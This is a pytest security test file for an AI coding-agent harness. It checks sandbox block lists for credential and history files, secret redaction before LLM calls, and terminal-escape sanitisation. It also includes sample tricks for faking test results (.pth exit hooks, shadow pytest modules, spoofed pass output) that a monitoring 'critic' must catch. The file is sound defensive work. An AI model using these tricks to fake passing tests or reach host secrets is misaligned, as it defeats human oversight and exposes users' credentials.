        joined = "\n".join(argv)
        assert str(home / ".pi") not in joined
        assert str(home / "Documents") not in joined
        assert str(home / "projects") not in joined


def test_exposes_home_blocks_sensitive_state_config_vault_and_agent_dirs(
    tmp_path, monkeypatch
):
    """HIGH-01: Sensitive state, config, vault, history, and agent directories
    under `$HOME` must be treated as exposing home, while legitimate runtime
    directories stay bindable."""
    from dacode.sandbox.bwrap import _bind_candidates, exposes_home

    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))

    blocked_dirs = (
        home / ".pi",
        home / ".pi" / "agent",
        home / ".gemini",
        home / ".gemini" / "antigravity",
        home / ".config",
        home / ".config" / "1Password",
        home / ".local" / "state",
        home / ".local" / "state" / "dacode",
        home / "Documents",
        home / "Documents" / "dacode_vault",
        home / ".hermes",
    )
    for d in blocked_dirs:
        d.mkdir(parents=True, exist_ok=True)
        assert exposes_home(d, home=home) is True, f"{d} should be blocked"
        assert _bind_candidates(d, home=home) == [], f"{d} must not be bound"

    blocked_files = (
        home / ".bash_history",
        home / ".vault-token",
        home / ".cargo" / "credentials.toml",
        home / "work" / ".env",
    )
    for f in blocked_files:
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text("secret\n", encoding="utf-8")
        assert exposes_home(f, home=home) is True, f"{f} should be blocked"
        assert _bind_candidates(f, home=home) == [], f"{f} must not be bound"

    allowed_dirs = (
        home / ".pi" / "agent" / "bin",
        home / ".hermes" / "tools",
        home / ".pyenv" / "versions" / "3.12",
    )
    for d in allowed_dirs:
        d.mkdir(parents=True, exist_ok=True)
        assert exposes_home(d, home=home) is False, f"{d} should stay bindable"
        assert _bind_candidates(d, home=home) == [d]


def test_host_pyvenv_cfg_under_local_does_not_bind_entire_dot_local(
    tmp_path, monkeypatch
):
    """HIGH-01: A host venv whose `pyvenv.cfg` points to `~/.local/bin` must not
    add `~/.local` itself (which holds `~/.local/state/dacode`)."""
    from dacode.sandbox.bwrap import interpreter_binds

    home = tmp_path / "home"
    (home / ".local" / "bin").mkdir(parents=True)
    (home / ".local" / "state" / "dacode").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))

    host_venv = tmp_path / "host-venv"
    (host_venv / "bin").mkdir(parents=True)
    py = host_venv / "bin" / "python"
    py.write_text("#!/bin/sh\n", encoding="utf-8")
    (host_venv / "pyvenv.cfg").write_text(f"home = {home / '.local' / 'bin'}\n", encoding="utf-8")

    binds = interpreter_binds((str(py), "-m", "pytest"), home=home)
    assert (home / ".local" / "bin") in binds
    assert (home / ".local" / "bin") in binds and (home / ".local") not in binds


def test_non_py_fixtures_and_nested_subdirs_in_tests_are_contract(tmp_path):
    """HIGH-02 (1 & 2): Non-Python fixture files (`tests/fixtures.json`) and
    nested helper subdirectories (`tests/support/helpers.py`) inside a dedicated
    test directory must be part of the contract."""
    (tmp_path / "tests" / "support").mkdir(parents=True)
    (tmp_path / "tests" / "test_app.py").write_text(
        "def test_ok():\n    assert 1 + 1 == 2\n", encoding="utf-8"
    )
    (tmp_path / "tests" / "fixtures.json").write_text('{"expected": 42}\n', encoding="utf-8")
    (tmp_path / "tests" / "support" / "helpers.py").write_text("EXPECTED = 42\n", encoding="utf-8")

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)
    assert "tests/fixtures.json" in contract
    assert "tests/support/helpers.py" in contract

    (tmp_path / "tests" / "fixtures.json").write_text('{"expected": 0}\n', encoding="utf-8")
    (tmp_path / "tests" / "support" / "helpers.py").write_text("EXPECTED = 0\n", encoding="utf-8")

    findings = critic._check_contract(tmp_path, contract)
    assert len(findings) == 2
    assert {f.check for f in findings} == {"tests_modified"}


def test_suffix_test_py_files_are_scanned_counted_and_guarded_against_stdout_spoofing(tmp_path):
    """HIGH-02 (3): Repositories using pytest's `*_test.py` naming must still get
    AST static checks, non-zero `_static_test_count`, and the `counts_from_stdout` guard."""
    (tmp_path / "calc_test.py").write_text(
        "def test_weak():\n    assert True\n", encoding="utf-8"
    )
    critic = PstackCritic(
        test_command=(sys.executable, "-c", "print('1 passed in 0.01s')"),
    )
    assert critic._static_test_count(tmp_path) == 1
    scan_findings, py_count = critic._scan_tests(tmp_path)
    assert py_count == 1
    assert scan_findings, "weak `assert True` in `*_test.py` must be flagged"

    (tmp_path / "calc_test.py").write_text(
        "def test_real():\n    assert 2 + 2 == 4\n", encoding="utf-8"
    )
    report = critic.review_workspace(tmp_path)
    assert report.passed is False
    assert "counts_from_stdout" in {f.check for f in report.findings}


def test_compiled_so_and_pytest_startup_deps_shadowing_are_contract(tmp_path):
    """HIGH-02 (4): Compiled `.so`/`.pyd` extensions shadowing runner modules,
    `.pth` hooks, and non-builtin pytest startup dependencies (`iniconfig`,
    `packaging`, `tomllib`) must be flagged as `tests_infra_modified`."""
    (tmp_path / "test_a.py").write_text("def test_a():\n    assert 1 + 1 == 2\n", encoding="utf-8")
    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    contract = critic.snapshot_contract(tmp_path)

    (tmp_path / "pytest.cpython-312-x86_64-linux-gnu.so").write_bytes(b"\x7fELFfake")
    (tmp_path / "iniconfig.py").write_text("raise SystemExit(0)\n", encoding="utf-8")
    (tmp_path / "hook.pth").write_text("import os; os._exit(0)\n", encoding="utf-8")

    findings = critic._check_contract(tmp_path, contract)
    assert len(findings) == 3
    assert {f.check for f in findings} == {"tests_infra_modified"}


def test_fallback_git_integrity_catches_renamed_tests_and_shadow_modules(tmp_path):
    """HIGH-02 (5): When `contract is None`, `_check_test_integrity` must split
    porcelain rename lines (`R  tests/test_a.py -> src/moved.py`) and catch
    shadow modules / packaging metadata."""
    (tmp_path / "tests").mkdir()
    (tmp_path / "src").mkdir()
    (tmp_path / "tests" / "test_a.py").write_text(
        "def test_a():\n    assert 1 == 2\n", encoding="utf-8"
    )
    (tmp_path / "src" / "app.py").write_text("X = 1\n", encoding="utf-8")
    _git_baseline(tmp_path)

    subprocess.run(
        ("git", "mv", "tests/test_a.py", "src/moved.py"),
        cwd=str(tmp_path),
        check=True,
    )
    (tmp_path / "pytest.abi3.so").write_bytes(b"\x7fELF")
    (tmp_path / "iniconfig.py").write_text("x = 1\n", encoding="utf-8")

    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
    findings = critic._check_test_integrity(tmp_path)
    checks = {f.check for f in findings}
    assert "tests_modified" in checks
    assert "tests_infra_modified" in checks


def test_vector_store_and_vault_memory_ignore_file_and_dir_symlinks(tmp_path):
    """HIGH-03 (1 & 4): Neither `VectorStore.index()` nor `VaultMemory` may follow
    leaf `.md` symlinks or symlinked parent directories inside the vault."""
    from dacode.memory import VaultMemory
    from dacode.memory.embedder import Embedder
    from dacode.memory.vectors import VectorStore

    vault = tmp_path / "vault"
    (vault / "Notes").mkdir(parents=True)
    (vault / "Notes" / "real.md").write_text(
        "---\ntitle: Real note\n---\nSafe vault content alpha.\n", encoding="utf-8"
    )

    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    outside_file = outside_dir / "host_secret.md"
    outside_file.write_text(
        "---\ntitle: Host secret\n---\nExfiltrated host token alpha.\n", encoding="utf-8"
    )

    (vault / "Notes" / "evil_file.md").symlink_to(outside_file)
    (vault / "EvilDir").symlink_to(outside_dir)

    seen_texts: list[str] = []

    class _RecordingEmbedder(Embedder):
        def __init__(self) -> None:
            super().__init__(base_url="http://fake", model="fake-m")

        def embed(self, texts: list[str]) -> list[list[float]]:
            seen_texts.extend(texts)
            return [[1.0, 0.0] for _ in texts]

    store = VectorStore(tmp_path / "embeddings.db")
    counts = store.index(vault, _RecordingEmbedder())
    assert counts["embedded"] == 1
    assert len(seen_texts) == 1
    assert "Exfiltrated" not in seen_texts[0]

    mem = VaultMemory(vault, semantic="off")
    hits = mem.retrieve("alpha", limit=10)
    assert [h.title for h in hits] == ["Real note"]


def test_vault_retrieve_redacts_secrets_on_stopword_and_symbol_queries(
    tmp_path, monkeypatch
):
    """HIGH-03 (2): Stopword-only (`'the'`) or symbol-only (`'?'`) queries take
    the empty-token branch in `VaultMemory.retrieve()` and must still redact secrets."""
    from dacode.memory import SemanticHit, VaultMemory

    secret = "sk-liveSecretTokenValue1234567890abcdef"
    monkeypatch.setenv("OPENAI_API_KEY", secret)
    monkeypatch.delenv("DACODE_SEMANTIC", raising=False)
    monkeypatch.delenv("DACODE_SEMANTIC_BACKEND", raising=False)

    vault = tmp_path / "vault"
    vault.mkdir()
    (vault / "note.md").write_text("placeholder\n", encoding="utf-8")

    class _FakeIndex:
        def search(self, query: str, top: int = 8):
            return [
                SemanticHit(
                    rel_path="note.md",
                    title=f"Leak {secret}",
                    similarity=0.95,
                    excerpt=f"key is {secret}",
                )
            ]

    mem = VaultMemory(vault, semantic="auto", semantic_index=_FakeIndex())
    for query in ("the", "?"):
        hits = mem.retrieve(query, limit=5)
        assert hits, f"expected semantic hit for {query!r}"
        assert secret not in hits[0].title
        assert secret not in hits[0].snippet


def test_scoped_vault_blocks_writing_to_shared_and_rejects_traversal_scopes(tmp_path):
    """HIGH-03 (3): Scoped `VaultMemory` may read `shared/Lessons` but must not
    allow `ingest()` into `shared/`, and `scope` / `folder` traversal must be rejected."""
    from dacode.memory import Lesson, VaultMemory

    vault = tmp_path / "vault"
    (vault / "shared" / "Lessons").mkdir(parents=True)
    (vault / "shared" / "Lessons" / "common.md").write_text(
        "---\ntitle: Shared lesson\n---\nCommon guidance.\n", encoding="utf-8"
    )

    for bad_scope in ("..", ".", "a/b", "a\\b"):
        with pytest.raises(ValueError):
            VaultMemory(vault, scope=bad_scope, semantic="off")

    scoped = VaultMemory(vault, scope="etf9", semantic="off")
    assert any(h.title == "Shared lesson" for h in scoped.retrieve("Common guidance"))

    lesson = Lesson(title="Scoped note", body="body")
    with pytest.raises(ValueError):
        scoped.ingest(lesson, folder="shared/Lessons")
    with pytest.raises(ValueError):
        scoped.ingest(lesson, folder="../outside")

    unscoped = VaultMemory(vault, semantic="off")
    with pytest.raises(ValueError):
        unscoped.ingest(lesson, folder="../outside")


def test_probe_and_failure_digest_redact_secrets_before_llm_proposal(tmp_path, monkeypatch):
    """MED-01: Secrets printed in trial stdout/stderr or gate output must be
    redacted in `ProbeResult` and `_failure_digest()` before reaching the LLM."""
    from dacode.discipline.critic import CritiqueReport
    from dacode.harness.models import ProbeResult
    from dacode.llm.stub import StubLLM

    secret = "sk-liveSecretTokenForMed01Test9876543210"
    gh_secret = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    monkeypatch.setenv("OPENAI_API_KEY", secret)

    class _LeakyExecutor:
        model = "test-model"

        def run(self, variant, workspace):
            return ExecResult(
                exit_code=1,
                stdout=f"trial stdout key={secret}",
                stderr=f"trial stderr token={gh_secret}",
                command="leaky",
            )

    class _LeakyCritic:
        def review_workspace(self, workspace, **kwargs):
            return CritiqueReport(
                passed=False,
                tests_total=2,
                tests_passed=1,
                tests_failed=1,
                stdout=f"AssertionError: leaked {secret}",
                stderr=f"gate stderr {gh_secret}",
                score=0.0,
                ran=True,
            )

    llm = StubLLM(default='[{"label": "v", "system_prompt": "fix it"}]')
    opt = HarnessOptimizer(
        llm=llm,
        sandbox=_Sandbox(tmp_path / "wt"),
        executor=_LeakyExecutor(),
        critic=_LeakyCritic(),
        budget=2,
        variants_per_round=1,
    )
    res = opt.run("fix bug", HarnessVariant(label="base"))
    probe = res.variants[0].probe
    assert probe is not None
    assert secret not in probe.stdout
    assert gh_secret not in probe.stderr
    assert secret not in probe.gate_output
    assert gh_secret not in probe.gate_output

    for call in llm.calls:
        blob = json.dumps(call)
        assert secret not in blob
        assert gh_secret not in blob

    # Also verify direct `_failure_digest` redaction on raw ProbeResult instances
    raw_variant = HarnessVariant(label="raw")
    raw_variant.probe = ProbeResult(
        variant_id=raw_variant.id,
        workspace=str(tmp_path),
        exit_code=1,
        critique_passed=False,
        gate_output=f"raw leak {secret}",
    )
    digest = opt._failure_digest([raw_variant])
    assert secret not in digest


def test_untrusted_dotenv_blocks_embed_config_and_malformed_numeric_env_falls_back(
    tmp_path, monkeypatch
):
    """MED-02: `<repo>/.env` must not set `DACODE_EMBED_MODEL`, `DACODE_EMBED_DIMS`,
    or `DACODE_EMBED_BATCH`, and non-numeric env vars must not crash `Embedder` or `DaCodeConfig`."""
    from dacode.config import DaCodeConfig
    from dacode.env import ENV_ALLOW_LIST, load_env
    from dacode.memory.embedder import Embedder

    for forbidden in ("DACODE_EMBED_MODEL", "DACODE_EMBED_DIMS", "DACODE_EMBED_BATCH"):
        assert forbidden not in ENV_ALLOW_LIST
        monkeypatch.delenv(forbidden, raising=False)
    monkeypatch.delenv("DACODE_EMBED_API_KEY", raising=False)
    monkeypatch.delenv("DACODE_ENV_TRUST", raising=False)

    dotenv = tmp_path / ".env"
    dotenv.write_text(
        "DACODE_EMBED_MODEL=attacker-model\n"
        "DACODE_EMBED_DIMS=not_an_int\n"
        "DACODE_EMBED_BATCH=not_an_int\n"
        "DACODE_EMBED_API_KEY=sk-embed-ok\n",
        encoding="utf-8",
    )
    loaded = load_env(dotenv)
    assert loaded == {"DACODE_EMBED_API_KEY": "sk-embed-ok"}

    monkeypatch.setenv("DACODE_EMBED_TIMEOUT", "not_a_float")
    monkeypatch.setenv("DACODE_EMBED_BATCH", "not_an_int")
    monkeypatch.setenv("DACODE_EMBED_DIMS", "not_an_int")
    emb = Embedder(base_url="http://127.0.0.1:11434/v1", model="bge-m3")
    assert emb.timeout == 60.0
    assert emb.batch == 16
    assert emb.dims is None

    monkeypatch.setenv("DACODE_BUDGET", "bad")
    monkeypatch.setenv("DACODE_VARIANTS", "bad")
    monkeypatch.setenv("DACODE_VARIANT_TIMEOUT", "bad")
    monkeypatch.setenv("DACODE_PARALLEL", "bad")
    cfg = DaCodeConfig.from_env(repo=tmp_path)
    assert cfg.budget == 2
    assert cfg.variants_per_round == 2
    assert cfg.variant_timeout == 900.0
    assert cfg.parallel == 1


def test_executors_and_critic_scrub_host_secrets_from_subprocess_env(tmp_path, monkeypatch):
    """MED-03: `PiExecutor`, `AgyExecutor`, `ScriptExecutor`, and `PstackCritic`
    must pass a scrubbed environment (`allowed_env`) to `subprocess.run` rather
    than leaking host secrets (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `LD_PRELOAD`)."""
    import types

    from dacode.executor.agy import AgyExecutor
    from dacode.executor.pi import PiExecutor
    from dacode.executor.script import ScriptExecutor
    from dacode.sandbox import bwrap as bwrap_mod
    from dacode.sandbox.bwrap import IsolationPolicy

    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "aws-ultra-secret")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_hostSecretToken1234567890abcdef")
    monkeypatch.setenv("LD_PRELOAD", "/tmp/evil_preload.so")
    monkeypatch.setenv("GLM_API_KEY", "sk-glm-allowed")
    monkeypatch.delenv("ZAI_API_KEY", raising=False)
    monkeypatch.setattr(bwrap_mod, "_AVAILABLE", True)

    fake_bin = tmp_path / "bin" / "agent"
    fake_bin.parent.mkdir()
    fake_bin.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    fake_bin.chmod(0o755)
    monkeypatch.setattr("dacode.executor.pi.shutil.which", lambda c: str(fake_bin))
    monkeypatch.setattr("dacode.executor.agy.shutil.which", lambda c: str(fake_bin))
    monkeypatch.setattr("dacode.sandbox.bwrap.shutil.which", lambda c: "/usr/bin/bwrap")

    seen_envs: list[tuple[str, dict | None]] = []

    def fake_run(cmd, **kwargs):
        seen_envs.append((kwargs.get("_tag", str(cmd[0])), kwargs.get("env")))
        return types.SimpleNamespace(returncode=0, stdout="1 passed in 0.01s\n", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)

    v = HarnessVariant(label="v", payload={"task": "t", "command": "echo hi"})
    for iso in (None, IsolationPolicy(enabled=True, network=True)):
        seen_envs.clear()
        PiExecutor(provider="zai", isolation=iso).run(v, tmp_path)
        AgyExecutor(isolation=iso).run(v, tmp_path)
        ScriptExecutor(isolation=iso).run(v, tmp_path)
        assert len(seen_envs) == 3
        for label, env in seen_envs:
            assert env is not None, f"{label} passed env=None (full os.environ)"
            assert "AWS_SECRET_ACCESS_KEY" not in env
            assert "GITHUB_TOKEN" not in env
            assert "LD_PRELOAD" not in env
        # PiExecutor with zai provider must still get ZAI_API_KEY when network is permitted
        assert seen_envs[0][1].get("ZAI_API_KEY") == "sk-glm-allowed"

    # Critic gate must scrub both host secrets AND provider API keys
    seen_envs.clear()
    (tmp_path / "test_x.py").write_text("def test_x():\n    assert 1 == 1\n", encoding="utf-8")
    for gate_iso in (None, IsolationPolicy(enabled=True, network=False)):
        PstackCritic(
            test_command=("/bin/echo", "1 passed in 0.01s"),
            isolation=gate_iso,
        )._run_once(["/bin/echo", "1 passed in 0.01s"], tmp_path)
    assert len(seen_envs) == 2
    for _label, env in seen_envs:
        assert env is not None
        assert "AWS_SECRET_ACCESS_KEY" not in env
        assert "GITHUB_TOKEN" not in env
        assert "LD_PRELOAD" not in env
        assert "GLM_API_KEY" not in env
        assert env.get("PYTEST_DISABLE_PLUGIN_AUTOLOAD") == "1"


def test_junit_counts_rejects_symlinks_and_bash_c_pytest_handles_comments_and_multiline(
    tmp_path,
):
    """MED-04: `_junit_counts()` must refuse symlinked `report.xml` files, and
    `PstackCritic` must still obtain a JUnit report when a `bash -c` command has
    trailing comments or multiple lines."""
    from dacode.discipline.critic import _junit_counts

    real_xml = tmp_path / "outside.xml"
    real_xml.write_text(
        '<?xml version="1.0"?><testsuites><testsuite tests="1" failures="0" '
        'errors="0" skipped="0"><testcase name="test_ok" classname="t"/>'
        "</testsuite></testsuites>",
        encoding="utf-8",
    )
    link_xml = tmp_path / "report.xml"
    link_xml.symlink_to(real_xml)
    assert _junit_counts(link_xml) is None

    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / "test_calc.py").write_text(
        "def test_calc():\n    assert 2 + 2 == 4\n", encoding="utf-8"
    )
    _git_baseline(ws)

    script = f"{sys.executable} -m pytest -q # run suite with comment\ntrue"
    critic = PstackCritic(test_command=("bash", "-c", script))
    report = critic.review_workspace(ws)
    assert report.passed is True, [f.message for f in report.findings]
    assert report.tests_total == 1
    assert "counts_unavailable" not in {f.check for f in report.findings}
    assert "counts_from_stdout" not in {f.check for f in report.findings}


def test_runlog_state_and_vector_db_files_are_mode_0600_even_in_shared_dir(
    tmp_path, monkeypatch
):
    """LOW-01: `runlog.jsonl`, `memory.db`, and `embeddings.db` must be created
    with mode `0600` rather than inheriting umask `0644`, without altering a
    pre-existing shared parent directory's permissions."""
    import os
    import stat

    from dacode import runlog
    from dacode.memory.vectors import VectorStore

    shared = tmp_path / "shared"
    shared.mkdir()
    os.chmod(shared, 0o755)

    log_file = shared / "runlog.jsonl"
    mem_db = shared / "memory.db"
    vec_db = shared / "embeddings.db"
    monkeypatch.setenv("DACODE_RUNLOG", str(log_file))
    monkeypatch.setenv("DACODE_MEMORY_DB", str(mem_db))

    old_umask = os.umask(0o022)
    try:
        runlog.record({"type": "run", "task": "t", "rounds": 1, "passed": True})
        store = VectorStore(vec_db)
        store.close()
    finally:
        os.umask(old_umask)

    assert stat.S_IMODE(os.stat(log_file).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(mem_db).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(vec_db).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(shared).st_mode) == 0o755


def test_terminal_sanitization_strips_c1_dcs_apc_nonletter_csi_and_protects_watch_and_cli():
    """LOW-02: Terminal sanitization must strip non-letter CSI (`~`), DCS/APC
    strings, 2-byte escapes, and 8-bit C1 controls across labels, `_strip_ansi`,
    `watch.render()`, and CLI output."""
    from dacode.discipline.critic import _parse_test_counts, _strip_ansi
    from dacode.harness.optimizer import _sanitize_label
    from dacode.watch import render

    payload = (
        "safe"
        "\x1b[200~paste\x1b[201~"
        "\x1bP+q544e\x1b\\"
        "\x1b_Gi=1\x1b\\"
        "\x9b31mc1red\x9b0m"
        "\x9d52;c;ZHVtbXk=\x9c"
        "\x1bc"
    )
    cleaned = _sanitize_label(payload)
    assert cleaned == "safepastec1red"
    assert "\x1b" not in cleaned
    assert "\x9b" not in cleaned
    assert "\x9d" not in cleaned

    multiline = "\x1b[200~\x9b32mline1\n2 passed in 0.01s\x9b0m\r\n"
    stripped = _strip_ansi(multiline)
    assert "\n" in stripped
    assert _parse_test_counts(multiline) == (2, 0, 0)

    frame = render(
        [
            {
                "type": "probe",
                "ts": 100.0,
                "task": "fix \x1b]52;c;pwn\x07\x9b31mbug",
                "variant_id": "v1\x1b[2J",
                "label": "lbl\x1bPevil\x1b\\",
                "exit_code": 1,
                "tests_passed": 0,
                "tests_total": 1,
                "elapsed_s": 1.0,
                "findings": ["err\x1b[200~"],
            }
        ]
    )
    assert "\x1b" not in frame
    assert "\x07" not in frame
    assert "\x9b" not in frame
    assert "[200~" not in frame


def test_interpreter_binds_parses_bash_c_and_script_executor_handles_list_under_isolation(
    tmp_path, monkeypatch
):
    """LOW-03: `interpreter_binds()` / `interpreter_root()` must extract the
    Python path from `bash -c '<py> -m pytest ...'`, and `ScriptExecutor.run()`
    must accept `list[str]` commands when isolation is enabled."""
    import types

    from dacode.executor.script import ScriptExecutor
    from dacode.sandbox import bwrap as bwrap_mod
    from dacode.sandbox.bwrap import IsolationPolicy, interpreter_binds, interpreter_root

    venv = tmp_path / "ext_venv"
    (venv / "bin").mkdir(parents=True)
    py = venv / "bin" / "python3"
    py.write_text("#!/bin/sh\n", encoding="utf-8")
    (venv / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")

    bash_cmd = ("/usr/bin/bash", "-c", f"{py} -m pytest tests/sub/test_a.py -q")
    assert interpreter_root(bash_cmd) == venv / "bin"
    binds = interpreter_binds(bash_cmd, home=tmp_path / "empty_home")
    assert py in binds
    assert venv in binds

    monkeypatch.setattr(bwrap_mod, "_AVAILABLE", True)
    seen_cmd: list[list[str]] = []

    def fake_run(cmd, **kwargs):
        seen_cmd.append(list(cmd))
        return types.SimpleNamespace(returncode=0, stdout="ok\n", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    ws = tmp_path / "ws"
    ws.mkdir()
    v = HarnessVariant(label="v", payload={"command": ["/bin/echo", "hello"]})
    res = ScriptExecutor(shell=False, isolation=IsolationPolicy(enabled=True)).run(v, ws)
    assert res.exit_code == 0
    assert seen_cmd and seen_cmd[0][-2:] == ["/bin/echo", "hello"]


def test_redact_covers_pem_asia_pypi_npm_stripe_and_mcp_caps_oversized_lines(
    monkeypatch,
):
    """LOW-04: `redact()` must catch PEM private keys, AWS `ASIA...` keys, PyPI,
    npm, Stripe keys, and `GITHUB_TOKEN`/`AWS_SECRET_ACCESS_KEY`/`ANTHROPIC_AUTH_TOKEN`
    env values; `MemoryServer.serve()` must reject oversized lines without OOMing."""
    import io

    from dacode.mcp import MemoryServer
    from dacode.mcp import server as mcp_server_mod
    from dacode.redact import redact

    pem = "".join((
        "-----BEGIN OPENSSH ",
        "PRIVATE KEY-----\n",
        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ==\n",
        "-----END OPENSSH ",
        "PRIVATE KEY-----",
    ))
    asia_key = "ASIA" + "IOSFODNN7EXAMPLE"
    pypi_key = "pypi-" + "AgEIcHlwaS5vcmcCJDEyMzQ1Njc4OTA"
    npm_key = "npm_" + "1234567890abcdefghijklmnop"
    stripe_key = "sk" + "_live_" + "1234567890abcdefghijklmn"
    assert "PRIVATE KEY" not in redact(pem)
    assert asia_key not in redact(f"temp key {asia_key}")
    assert pypi_key not in redact(f"upload {pypi_key}")
    assert npm_key not in redact(f"auth {npm_key}")
    assert stripe_key not in redact(f"charge {stripe_key}")

    for env_name in (
        "GITHUB_TOKEN",
        "GH_TOKEN",
        "AWS_SECRET_ACCESS_KEY",
        "ANTHROPIC_AUTH_TOKEN",
    ):
        val = f"customOpaqueSecretFor{env_name}999"
        monkeypatch.setenv(env_name, val)
        assert val not in redact(f"leaked {env_name}={val}")

    monkeypatch.setattr(mcp_server_mod, "MAX_REQUEST_CHARS", 128, raising=False)
    server = MemoryServer()
    huge_line = '{"jsonrpc":"2.0","id":1,"method":"ping","pad":"' + ("x" * 300) + '"}\n'
    ok_line = '{"jsonrpc":"2.0","id":2,"method":"ping"}\n'
    out = io.StringIO()
    server.serve(stdin=io.StringIO(huge_line + ok_line), stdout=out)
    responses = [json.loads(line) for line in out.getvalue().splitlines() if line.strip()]
    assert len(responses) == 2
    assert "error" in responses[0]
    assert responses[1]["id"] == 2
    assert responses[1]["result"] == {}








